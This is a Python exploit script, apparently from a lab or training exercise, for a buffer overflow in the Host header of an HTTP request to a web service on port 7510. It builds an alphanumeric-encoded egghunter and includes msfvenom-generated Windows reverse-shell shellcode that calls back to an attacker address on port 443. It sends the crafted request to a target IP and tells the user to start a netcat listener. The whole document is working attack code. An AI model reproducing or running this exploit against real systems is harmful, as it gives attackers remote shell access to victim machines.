#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import os
import sys

egghunter=(
"\x54"                      #push ESP
"\x58"                      #pop EAX
"\x2D\x66\x4D\x55\x55"      #sub EAX,55554D66
"\x2D\x66\x4B\x55\x55"      #sub EAX,55554B66
"\x2D\x6A\x50\x55\x55"      #sub EAX,5555506A
"\x50"                      #push EAX
"\x5C"                      #pop ESP 
"\x41\x41"                  #inc EAX, inc EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x7f\x09\x7f\x09"      #SUB EAX, 97F097F
"\x2d\x07\x07\x7c\x09"      #SUB EAX, 97C0707
"\x2d\x05\x08\x05\x05"      #SUB EAX, 5050805
"\x50"                      #PUSH EAX - PUSHES E7FFE775 onto stack 
"\x41\x41"                  #INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x4f\x09\x71\x41"      #SUB EAX, 4171094F
"\x2d\x01\x79\x31\x09"      #SUB EAX, 9317901
"\x2d\x01\x08\x73\x05"      #SUB EAX, 5730801
"\x50"                      #PUSH EAX - PUSHES AFEA75AF
"\x41\x41"                  #INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232  
"\x48"                      #DEC EAX
"\x2d\x70\x75\x41\x01"      #SUB EAX, 1417570
"\x2d\x5f\x33\x33\x04"      #SUB EAX, 433335F
"\x50"                      #PUSH EAX - PUSHES FA8B5730 onto stack
"\x41\x41"                  #INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x09\x01\x77\x77"      #SUB EAX, 77770109
"\x2d\x08\x46\x34\x58"      #SUB EAX, 58344608
"\x50"                      #PUSH EAX - PUSHES 3054B8EF onto stack
"\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x7f\x7f\x6f\x43"      #SUB EAX, 436F7F7F
"\x2d\x45\x7b\x36\x48"      #SUB EAX, 48367B45
"\x50"                      #PUSH EAX - PUSHES 745A053C onto stack
"\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x7f\x76\x01\x70"      #SUB EAX, 7001767F
"\x2d\x7f\x31\x31\x61"      #SUB EAX, 6131317F
"\x50"                      #PUSH EAX - PUSHES 2ECD5802 onto stack
"\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x2d\x7f\x77\x77\x62"      #SUB EAX, 6277777F
"\x2d\x72\x46\x36\x33"      #SUB EAX, 33364672
"\x50"                      #PUSH EAX - PUSHES 6A52420F onto stack
"\x41\x41\x41"              #INC EAX, INC EAX, INC EAX
"\x25\x41\x41\x41\x41"      #AND EAX, 41414141
"\x25\x32\x32\x32\x32"      #AND EAX, 32323232
"\x48"                      #DEC EAX
"\x05\x01\x01\x7f\x7f"      #ADD EAX, 7F7F0101
"\x2d\x66\x47\x71\x47"      #SUB EAX, 47714766    
"\x2d\x34\x38\x43\x38"      #SUB EAX, 38433834
"\x50"                      #PUSH EAX - PUSHES FFCA8166 onto stack
"\x41")                     #INC EAX

# msfvenom -p windows/shell_reverse_tcp -v shell -f python LHOST=192.168.100.53 LPORT=443 -e x86/shikata_ga_nai -b "\x00\x2e"
#Payload size: 351 bytes
#Added nop at beginning to be divisible by 4
shell =  ""
shell += "\x90\xba\xca\x10\x0b\xf1\xda\xdf\xd9\x74\x24\xf4\x5e\x31"
shell += "\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\x9c\x1e\xe9"
shell += "\x04\xdc\xf7\x6f\xe6\x1c\x08\x10\x6e\xf9\x39\x10\x14"
shell += "\x8a\x6a\xa0\x5e\xde\x86\x4b\x32\xca\x1d\x39\x9b\xfd"
shell += "\x96\xf4\xfd\x30\x26\xa4\x3e\x53\xa4\xb7\x12\xb3\x95"
shell += "\x77\x67\xb2\xd2\x6a\x8a\xe6\x8b\xe1\x39\x16\xbf\xbc"
shell += "\x81\x9d\xf3\x51\x82\x42\x43\x53\xa3\xd5\xdf\x0a\x63"
shell += "\xd4\x0c\x27\x2a\xce\x51\x02\xe4\x65\xa1\xf8\xf7\xaf"
shell += "\xfb\x01\x5b\x8e\x33\xf0\xa5\xd7\xf4\xeb\xd3\x21\x07"
shell += "\x91\xe3\xf6\x75\x4d\x61\xec\xde\x06\xd1\xc8\xdf\xcb"
shell += "\x84\x9b\xec\xa0\xc3\xc3\xf0\x37\x07\x78\x0c\xb3\xa6"
shell += "\xae\x84\x87\x8c\x6a\xcc\x5c\xac\x2b\xa8\x33\xd1\x2b"
shell += "\x13\xeb\x77\x20\xbe\xf8\x05\x6b\xd7\xcd\x27\x93\x27"
shell += "\x5a\x3f\xe0\x15\xc5\xeb\x6e\x16\x8e\x35\x69\x59\xa5"
shell += "\x82\xe5\xa4\x46\xf3\x2c\x63\x12\xa3\x46\x42\x1b\x28"
shell += "\x96\x6b\xce\xff\xc6\xc3\xa1\xbf\xb6\xa3\x11\x28\xdc"
shell += "\x2b\x4d\x48\xdf\xe1\xe6\xe3\x1a\x62\xc9\x5c\x40\x47"
shell += "\xa1\x9e\x88\xa6\x8a\x16\x6e\xc2\xfc\x7e\x39\x7b\x64"
shell += "\xdb\xb1\x1a\x69\xf1\xbc\x1d\xe1\xf6\x41\xd3\x02\x72"
shell += "\x51\x84\xe2\xc9\x0b\x03\xfc\xe7\x23\xcf\x6f\x6c\xb3"
shell += "\x86\x93\x3b\xe4\xcf\x62\x32\x60\xe2\xdd\xec\x96\xff"
shell += "\xb8\xd7\x12\x24\x79\xd9\x9b\xa9\xc5\xfd\x8b\x77\xc5"
shell += "\xb9\xff\x27\x90\x17\xa9\x81\x4a\xd6\x03\x58\x20\xb0"
shell += "\xc3\x1d\x0a\x03\x95\x21\x47\xf5\x79\x93\x3e\x40\x86"
shell += "\x1c\xd7\x44\xff\x40\x47\xaa\x2a\xc1\x77\xe1\x76\x60"
shell += "\x10\xac\xe3\x30\x7d\x4f\xde\x77\x78\xcc\xea\x07\x7f"
shell += "\xcc\x9f\x02\x3b\x4a\x4c\x7f\x54\x3f\x72\x2c\x55\x6a"
shell += "\xcc" * 500

#offset match at 3381
#rubbish = "\x41" * 3377 +"\x4c\x4c\x77\x21" + "\x2b\x46\x35\x6d" + "\x43"*29
#rubbish+= egghunter + "\x41" * (360 - len(egghunter)) + ":7510"
rubbish = "\x4c"*3377 + "\x4c\x4c\x77\x21\x2b\x46\x35\x6d" + "G"*32 + egghunter + "A"*100 + ":7510"
print "Egghunter Length : " + str(len(egghunter))
print "Shell Code Length : " + str(len(shell))

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + rubbish + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent:+ Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
#buffer+="T00WT00W" + "\xcc" * 1242
buffer+=("T00WT00W" + "C" * 64 + shell + "\xcc" * (1234-len(shell)))

print "[*] Sending evil shenanigans - be patient"
print "[*] Set up netcat listener on TCP 443"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.176",7510))
s.send(buffer)
s.close()
